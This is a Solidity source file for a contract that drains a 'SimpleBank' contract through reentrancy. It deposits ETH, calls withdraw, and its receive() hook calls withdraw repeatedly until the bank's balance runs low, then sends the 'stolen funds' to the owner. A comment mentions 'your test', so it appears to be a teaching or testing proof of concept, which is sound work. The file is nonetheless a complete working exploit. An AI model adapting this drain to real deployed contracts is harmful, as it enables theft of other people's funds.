pragma solidity ^0.8.13;

import {SimpleBank} from "./SimpleBank.sol";

contract SimpleBankAttacker {
    SimpleBank public bank;
    address public owner;
    uint256 public attackAmount;

    constructor(SimpleBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    // Start the attack by depositing and then calling withdraw once
    function attack() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value > 0, "need ETH");

        attackAmount = msg.value;

        // Step 1: Deposit from THIS contract into the bank
        bank.deposit{value: msg.value}();

        // Step 2: trigger the first withdraw
        bank.withdraw();
    }

    // This is called when the bank sends ETH to us
    receive() external payable {
        // While the bank still has enough ETH to send us the full amount,
        // re-enter withdraw() again
        if (address(bank).balance >= attackAmount) {
            bank.withdraw();
        }

        // When balance < attackAmount, we stop reentering and unwind.
    }

    // Pull stolen funds out to the EOA (your test)
    function withdrawToOwner() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
